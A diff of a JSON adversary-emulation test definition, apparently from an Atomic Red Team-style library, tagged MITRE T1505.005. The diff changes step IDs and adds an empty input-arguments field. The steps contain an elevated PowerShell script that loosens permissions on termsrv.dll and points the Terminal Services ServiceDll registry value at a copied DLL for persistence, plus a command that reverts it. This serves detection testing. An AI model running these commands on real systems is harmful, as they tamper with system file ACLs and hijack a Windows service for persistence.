@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "9e7c463c-208e-4c53-a604-28315c816113",
+      "id": "c7c641a0-f70e-46a2-a3e5-1aa1f0855c16",
       "type": "execute-command",
       "data": {
         "command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path $termsrvDll -Destination \"$HOME\\AtomicTest.dll\"\n\n$newServiceDll = \"$HOME\\AtomicTest.dll\"\n\n$registryPath = \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\"\n\n# Check if the registry key exists\nif (Test-Path -Path $registryPath) {\n    # Modify the ServiceDll value in the registry\n    Set-ItemProperty -Path $registryPath -Name \"ServiceDll\" -Value $newServiceDll\n    Write-Host \"ServiceDll value in the registry has been updated to: $newServiceDll\"\n} else {\n    Write-Host \"Registry key not found. Make sure the 'TermService\\Parameters' key exists.\"\n}",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "3d2b1a67-1ee3-4fcd-9b70-f72cd8d5a975",
+      "id": "56f8d973-92ca-4c41-9479-db722f3c92a0",
       "type": "execute-command",
       "data": {
         "command": "Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\" -Name \"ServiceDll\" -Value \"C:\\Windows\\System32\\termsrv.dll\"",
@@ -27,18 +27,19 @@
   ],
   "flows": [
     {
-      "s": "9e7c463c-208e-4c53-a604-28315c816113",
+      "s": "c7c641a0-f70e-46a2-a3e5-1aa1f0855c16",
       "p": "on-success",
-      "o": "3d2b1a67-1ee3-4fcd-9b70-f72cd8d5a975"
+      "o": "56f8d973-92ca-4c41-9479-db722f3c92a0"
     },
     {
-      "s": "9e7c463c-208e-4c53-a604-28315c816113",
+      "s": "c7c641a0-f70e-46a2-a3e5-1aa1f0855c16",
       "p": "on-failure",
-      "o": "3d2b1a67-1ee3-4fcd-9b70-f72cd8d5a975"
+      "o": "56f8d973-92ca-4c41-9479-db722f3c92a0"
     }
   ],
   "tags": [
     "T1505",
     "T1505.005"
-  ]
+  ],
+  "input_arguments": null
 }
